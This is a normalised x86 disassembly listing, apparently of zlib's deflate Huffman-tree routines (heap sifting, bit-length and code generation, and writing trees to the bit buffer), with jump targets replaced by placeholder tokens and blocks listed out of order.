mov [ ecx + eax * 4 + 0xb54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x144c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ edx + ecx * 4 + 0xb54 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
xor esi esi
mov si [ edx + ecx * 4 ]
add eax esi
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] ax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
xor ecx ecx
mov cl [ eax + 0x1450 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + 0x1450 ]
cmp ecx eax
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x144c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xb58 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_409a0d
add esp 0x8
mov ecx [ ebp + 0x8 ]
add ecx 0xb34
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
call sub_409d40
add esp 0xc
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x24 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x1450 ] dl
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2 ] ax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2 ] ax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0xb58 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
push 0x1
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40986e
add esp 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1448 ] 0x2
jge r-xdata
sub_40986e
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb54 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
shl eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0xb54 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x1448 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + eax * 4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0xc ]
xor esi esi
mov si [ ecx + eax * 4 ]
cmp edx esi
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xb58 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0xb54 ]
mov edx [ ebp + 0xc ]
xor esi esi
mov si [ edx + ecx * 4 ]
cmp eax esi
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + edx * 4 + 0xb54 ]
mov eax [ ebp + 0xc ]
xor esi esi
mov si [ eax + edx * 4 ]
cmp ecx esi
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb58 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + edx * 4 + 0xb54 ]
mov eax [ ebp + 0xc ]
xor esi esi
mov si [ eax + edx * 4 ]
cmp ecx esi
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0xb54 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x1450 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov bl [ ecx + eax + 0x1450 ]
cmp edx ebx
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xb58 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + eax + 0x1450 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov bl [ ecx + eax + 0x1450 ]
cmp edx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x1448 ]
jg r-xdata
sub_409a0d
push ebp
mov ebp esp
sub esp 0x34
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
cmp [ ebp - 0x18 ] 0xf
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xb54 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 + 0x2 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0xb34 ] 0x0
jmp r-xdata
cmp [ ebp - 0x20 ] 0x23d
jge r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb54 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x2 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x8 ]
jle r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x10 ]
mov cx [ ebp - 0x18 ]
mov [ eax + edx * 4 + 0x2 ] cx
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x34 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 2 + 0xb34 ]
sub dx 0x1
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 2 + 0xb34 ] dx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 2 + 0xb36 ]
add cx 0x2
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0xb36 ] cx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 2 + 0xb34 ]
sub ax 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 2 + 0xb34 ] ax
mov eax [ ebp - 0xc ]
sub eax 0x2
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jg r-xdata
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 2 + 0xb34 ]
add dx 0x1
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 2 + 0xb34 ] dx
mov [ ebp - 0x24 ] 0x0
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 2 + 0xb34 ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ecx + eax * 4 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x24 ]
imul eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x16a0 ]
add ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x24 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
xor esi esi
mov si [ edx + ecx * 4 + 0x2 ]
add esi [ ebp - 0x24 ]
imul eax esi
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a4 ]
add edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a4 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 2 + 0xb34 ]
mov [ ebp - 0x30 ] edx
jmp r-xdata
mov eax [ ebp - 0x20 ]
sub eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xb54 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x34 ]
jle r-xdata
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x30 ]
sub eax 0x1
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
mov edx [ ebp - 0x18 ]
sub edx ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
xor esi esi
mov si [ ecx + eax * 4 ]
imul edx esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16a0 ]
add ecx edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ebp - 0x18 ]
mov [ ecx + eax * 4 + 0x2 ] dx
cmp [ ebp - 0x30 ] 0x0
je r-xdata
sub_409d40
push ebp
mov ebp esp
sub esp 0x34
push esi
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0xf
jg r-xdata
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x28 ]
and ecx 0xffff
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
xor esi esi
mov si [ eax + edx * 2 - 0x2 ]
add ecx esi
shl ecx 0x1
mov [ ebp - 0x28 ] cx
mov ecx [ ebp - 0x4 ]
mov dx [ ebp - 0x28 ]
mov [ ebp + ecx * 2 - 0x24 ] dx
jmp r-xdata
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x30 ]
xor ecx ecx
mov cx [ ebp + eax * 2 - 0x24 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x34 ]
push edx
mov eax [ ebp - 0x30 ]
mov cx [ ebp + eax * 2 - 0x24 ]
add cx 0x1
mov edx [ ebp - 0x30 ]
mov [ ebp + edx * 2 - 0x24 ] cx
call sub_40ba7c
add esp 0x8
mov ecx [ ebp - 0x2c ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] ax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x1
mov [ ebp - 0x2c ] eax
sub_409e05
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb14 ]
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x8c
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_409ebc
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xb20 ]
push edx
mov eax [ ebp + 0x8 ]
add eax 0x980
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_409ebc
add esp 0xc
mov edx [ ebp + 0x8 ]
add edx 0xb28
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4094ce
add esp 0x8
mov [ ebp - 0x4 ] 0x12
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
imul eax eax 0x3
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a0 ]
lea eax [ edx + eax + 0xe ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a0 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + r--data ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0xa76 ]
test edx edx
je r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_409ebc
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x18 ] 0xffffffff
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x2 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax + edx * 4 + 0x6 ] 0xffff
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
mov edx [ ebp - 0x1c ]
cmp edx [ ebp + 0x10 ]
jg r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x6 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 4 + 0xa74 ]
add cx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0xa74 ] cx
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xabc ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xabc ] dx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xab8 ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xab8 ] dx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xab4 ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xab4 ] dx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 4 + 0xa74 ]
add cx 0x1
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0xa74 ] cx
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x6
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
sub_40a059
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x8 ] 0x5
mov eax 0x10
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp + 0xc ]
sub edx 0x101
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0xc ]
sub edx 0x101
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0xc ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x8 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x14 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x10 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x10 ] 0x5
mov edx 0x10
sub edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp + 0x14 ]
sub edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x14 ]
sub ecx 0x4
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x1c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
mov edx 0x10
sub edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
sub edx 0x1
push edx
mov eax [ ebp + 0x8 ]
add eax 0x8c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a57c
add esp 0xc
mov edx [ ebp + 0x10 ]
sub edx 0x1
push edx
mov eax [ ebp + 0x8 ]
add eax 0x980
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a57c
add esp 0xc
mov esp ebp
pop ebp
retn
mov [ ebp - 0x20 ] 0x3
mov ecx 0x10
sub ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa76 ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa76 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
